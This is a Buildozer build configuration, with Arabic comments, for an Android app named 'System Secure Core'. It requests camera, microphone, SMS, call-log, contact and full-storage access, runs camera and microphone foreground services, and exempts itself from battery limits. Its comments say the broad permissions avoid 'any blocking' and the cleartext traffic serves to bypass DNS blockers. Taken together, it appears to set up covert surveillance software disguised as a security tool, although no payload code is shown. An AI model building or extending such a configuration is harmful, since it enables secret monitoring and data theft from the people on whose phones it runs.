[app]

# ====== هوية التطبيق (إصدار جديد تمامًا لتجنب التضارب) ======
title = System Secure Core
package.name = com.secure.sys.v4
package.domain = org.secure
version = 4.1.0

# ====== المصادر والملفات ======
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite, res/*
source.exclude_dirs = tests, __pycache__, docs, .github, .sys_runtime

# ====== المكتبات المطلوبة (مع tflite-runtime للـ AI) ======
requirements = python3, kivy==2.3.0, requests, urllib3, certifi, pillow, pyjnius, android, cryptography==42.0.5, pyzipper, numpy, tflite-runtime==2.14.0

# ====== أيقونة التطبيق ======
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# ====== صلاحيات Android (شاملة لتجنب أي حظر) ======
android.permissions = \
    INTERNET, \
    ACCESS_NETWORK_STATE, \
    ACCESS_WIFI_STATE, \
    CAMERA, \
    RECORD_AUDIO, \
    WAKE_LOCK, \
    FOREGROUND_SERVICE, \
    POST_NOTIFICATIONS, \
    REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, \
    MANAGE_EXTERNAL_STORAGE, \
    READ_EXTERNAL_STORAGE, \
    WRITE_EXTERNAL_STORAGE, \
    READ_MEDIA_IMAGES, \
    READ_MEDIA_VIDEO, \
    READ_MEDIA_AUDIO, \
    READ_CONTACTS, \
    READ_SMS, \
    READ_CALL_LOG, \
    FOREGROUND_SERVICE_DATA_SYNC, \
    FOREGROUND_SERVICE_CAMERA, \
    FOREGROUND_SERVICE_MICROPHONE

# ====== إعدادات SDK/NDK (متوافقة مع Android 14 API 34) ======
android.api = 34
android.minapi = 21
android.sdk = 34
android.ndk = 25b
android.build_tools_ver = 34.0.0
android.accept_sdk_license = True

# مسارات الأدوات الثابتة (لـ GitHub Actions)
android.sdk_path = /usr/local/lib/android/sdk
android.ndk_path = /usr/local/lib/android/sdk/ndk-bundle
android.ant_path = /usr/bin/ant

# ====== المعمارية المستهدفة ======
android.archs = arm64-v8a

# ====== إعدادات الشبكة والتخزين (تجاوز الحظر) ======
android.allow_backup = False
android.request_legacy_external_storage = True
android.uses_cleartext_traffic = True   # مهم لتجاوز بعض الـ DNS blockers

# ====== خدمات الخلفية والطاقة ======
android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True

# ====== شاشة وواجهة ======
orientation = portrait
fullscreen = 1

# ====== إعدادات البناء والتسجيل ======
log_level = 2
warn_on_root = 0

# ====== ميتا بيانات إضافية ======
android.meta_data = android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS=1

# ====== تحسين أداء البايثون ======
android.no_byte_compile_python = False
android.optimize_python = True

[buildozer]
log_level = 2
warn_on_root = 1
